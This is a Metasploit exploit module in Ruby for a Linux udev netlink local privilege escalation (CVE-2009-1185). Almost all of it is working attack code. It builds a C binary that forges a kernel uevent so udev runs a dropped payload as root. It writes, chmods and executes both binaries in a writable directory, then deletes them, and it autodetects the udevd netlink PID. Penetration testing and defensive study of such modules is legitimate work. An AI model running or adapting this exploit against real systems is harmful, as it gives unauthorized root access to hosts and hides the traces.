##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/local/unix'

#load 'lib/msf/core/post/file.rb'
#load 'lib/msf/core/exploit/local/unix.rb'
#load 'lib/msf/core/exploit/local/linux.rb'
#load 'lib/msf/core/exploit/local/linux_kernel.rb'

class Metasploit4 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  include Msf::Exploit::Local::LinuxKernel
  include Msf::Exploit::Local::Linux
  include Msf::Exploit::Local::Unix

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'Linux udev Netlink Local Privilege Escalation',
        'Description'   => %q{
          Versions of udev < 1.4.1 do not verify that netlink messages are
          coming from the kernel. This allows local users to gain privileges by
          sending netlink messages from userland.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'kcope',           # discovery
            'Jon Oberheide',   # 95-udev-late.rules technique
            'egypt'            # metasploit module
          ],
        'Platform'      => [ 'linux' ],
        'Arch'          => [ ARCH_X86 ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'References'    =>
          [
            [ 'CVE', '2009-1185' ],
            [ 'BID', '34536' ],
          ],
        'Targets'       =>
          [
            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
            [ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ],
            #[ 'Command payload', { 'Arch' => ARCH_CMD } ],
          ],
        'DefaultOptons' => { 'WfsDelay' => 2 },
        'DefaultTarget' => 0,
        'DisclosureDate' => "",
      }
      ))
    register_options([
        OptString.new("WritableDir", [ true, "A directory where we can write files (must not be mounted noexec)", "/tmp" ]),
        OptInt.new("NetlinkPID", [ false, "Usually udevd pid-1.  Meterpreter sessions will autodetect" ]),
      ], self.class)
  end

  def exploit

    if datastore["NetlinkPID"] and datastore["NetlinkPID"] != 0
      netlink_pid = datastore["NetlinkPID"]
    else
      print_status("Attempting to autodetect netlink pid...")
      netlink_pid = autodetect_netlink_pid
    end

    if not netlink_pid
      print_error "Couldn't autodetect netlink PID, try specifying it manually."
      print_error "Look in /proc/net/netlink for a PID near that of the udevd process"
      return
    else
      print_good "Found netlink pid: #{netlink_pid}"
    end

    sc = Metasm::ELF.new(@cpu)
    sc.parse %Q|
      #define DEBUGGING
      #define NULL ((void*)0)
      #ifdef __ELF__
        .section ".bss" rwx
        .section ".text" rwx
        .entrypoint
      #endif
      call main
      push eax
      call exit
    |

    # Set up the same include order as the bionic build system.
    # See external/source/meterpreter/source/bionic/libc/Jamfile
    cparser.lexer.include_search_path = [
      "external/source/meterpreter/source/bionic/libc/include/",
      "external/source/meterpreter/source/bionic/libc/private/",
      "external/source/meterpreter/source/bionic/libc/bionic/",
      "external/source/meterpreter/source/bionic/libc/kernel/arch-x86/",
      "external/source/meterpreter/source/bionic/libc/kernel/common/",
      "external/source/meterpreter/source/bionic/libc/arch-x86/include/",
    ]

    cparser.parse(%Q|
      #define DEBUGGING
      // Fixes a parse error in bionic's libc/kernel/arch-x86/asm/types.h
      #ifndef __extension__
      #define __extension__
      #endif
      // Fixes a parse error in bionic's libc/include/sys/cdefs_elf.h
      // Doing #if on an undefined macro is fine in GCC, but a parse error in
      // metasm.
      #ifndef __STDC__
      #define __STDC__ 0
      #endif
      #include <sys/types.h>
      #include <stdarg.h>
      #include <stdio.h>
      #include <unistd.h>
      #include <errno.h>
    |)

    [
      "external/source/meterpreter/source/bionic/libc/bionic/__errno.c",
      "external/source/meterpreter/source/bionic/libc/bionic/__set_errno.c",
      "external/source/meterpreter/source/bionic/libc/stdio/stdio.c",
    ].each do |fname|
      cparser.parse(File.read(fname), fname)
    end

    payload_path = "#{datastore["WritableDir"]}/#{Rex::Text.rand_text_alpha(10)}"
    evil_path = "#{datastore["WritableDir"]}/#{Rex::Text.rand_text_alpha(10)}"

    unix_socket_h(sc)
    linux_x86_syscall_wrappers(sc)

    main = %Q^
#include <string.h>
#include <linux/netlink.h>

int main() {
  int sock;
  struct iovec iov;
  struct sockaddr_nl sa;
  struct msghdr msg;
  char *mp;
  char message[4096];

  memset(sa, 0, sizeof(sa));
  sa.nl_family = AF_NETLINK;
  sa.nl_pid = #{netlink_pid};
  sa.nl_groups = 0;

  msg.msg_name = (void *)&sa;
  msg.msg_namelen = sizeof(sa);
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
  bind(sock, (struct sockaddr *) &sa, sizeof(sa));

  mp = message;
  mp += sprintf(mp, "remove@/d") + 1;
  mp += sprintf(mp, "SUBSYSTEM=block") + 1;
  mp += sprintf(mp, "DEVPATH=/dev/#{Rex::Text.rand_text_alpha(10)}") + 1;
  mp += sprintf(mp, "TIMEOUT=10") + 1;
  mp += sprintf(mp, "ACTION=remove") +1;
  mp += sprintf(mp, "REMOVE_CMD=#{payload_path}") +1;

  iov.iov_base = (void*)message;
  iov.iov_len = (int)(mp-message);

  sendmsg(sock, &msg, 0);

  close(sock);

  return 0;
}
^
    cparser.parse(main, "main.c")

    asm = cpu.new_ccompiler(cparser, sc).compile

    sc.parse asm

    sc.assemble

    begin
      elf = sc.encode_string
    rescue
      print_error "Metasm Encoding failed: #{$!}"
      elog "Metasm Encoding failed: #{$!.class} : #{$!}"
      elog "Call stack:\n#{$!.backtrace.join("\n")}"
      return
    end

    pl = payload.encoded_exe
    print_status "Writing payload executable (#{pl.length} bytes) to #{payload_path}"
    write_file(payload_path, pl)

    print_status "Writing exploit executable (#{elf.length} bytes) to #{evil_path}"
    write_file(evil_path, elf)

    print_status "chmod'ing and running it..."
    cmd_exec("chmod 755 #{evil_path} #{payload_path}")
    cmd_exec("#{evil_path}")

    rm_f(evil_path, payload_path)
  end

  def autodetect_netlink_pid
    netlink_pid = nil

    case session.type
    when "meterpreter"
      print_status("Meterpreter session, using get_processes to find netlink pid")
      process_list = session.sys.process.get_processes
      udev_proc = process_list.find {|p| p["name"] =~ /udevd/ }
      udev_pid = udev_proc["pid"]
      print_status "udev pid: #{udev_pid}"
      netlink = read_file("/proc/net/netlink")
      netlink.each_line do |line|
        pid = line.split(/\s+/)[2].to_i
        if pid == udev_pid - 1
          netlink_pid = pid
          break
        end
      end
    else
      print_status("Shell session, trying sh script to find netlink pid")
      netlink_pid = cmd_exec(
        %q^
        for netlink_pid in $(awk '{print $3}' /proc/net/netlink |sort -u|grep -v -- -); do
          for udev_pid in $(ps aux | grep [u]devd | awk '{print $2}'); do
            [ $(( $udev_pid-1 )) = $netlink_pid ] && echo $netlink_pid ;
          done;
        done ^)
      netlink_pid = nil if netlink_pid.empty?
    end

    netlink_pid
  end
end
